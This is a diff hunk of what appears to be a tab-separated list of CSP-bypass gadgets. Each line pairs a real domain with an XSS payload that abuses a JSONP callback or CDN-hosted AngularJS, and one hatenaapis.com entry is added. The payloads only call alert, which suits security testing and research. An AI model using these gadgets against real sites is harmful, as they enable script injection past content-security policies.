@@ -23,6 +23,7 @@ app-sjint.marketo.com	<script src="https://app-sjint.marketo.com/index.php/form/
 app.link	<script src="https://app.link/_r?sdk=web&callback=alert"></script>	renniepak
 apps.bdimg.com	<body ng-app ng-csp><script src="https://apps.bdimg.com/libs/angular.js/1.4.6/angular.min.js"></script><input autofocus ng-focus="$event.composedPath()|orderBy:'[].constructor.from([1],alert)'"></body>	
 bebezoo.1688.com	<script src="https://bebezoo.1688.com/fragment/index.htm?callback=alert(1337)"></script>	
+bookmark.hatenaapis.com	<script src="https://bookmark.hatenaapis.com/count/entry?url=x&callback=alert"></script>	renniepak
 c.y.qq.com	<script src="https://c.y.qq.com/v8/fcg-bin/v8.fcg?&notice=0&format=jsonp&channel=singer&page=list&jsonpCallback=alert"></script>	renniepak
 cas.criteo.com	<script src="https://cas.criteo.com/delivery/0.1/napi.jsonp?zoneid=377600&callback=alert(1)"></script>	renniepak
 cdn.bootcdn.net	<body ng-app ng-csp><script src="https://cdn.bootcdn.net/ajax/libs/angular.js/1.8.0/angular.min.js"></script><input autofocus ng-focus="$event.composedPath()|orderBy:'[].constructor.from([1],alert)'"></body>	
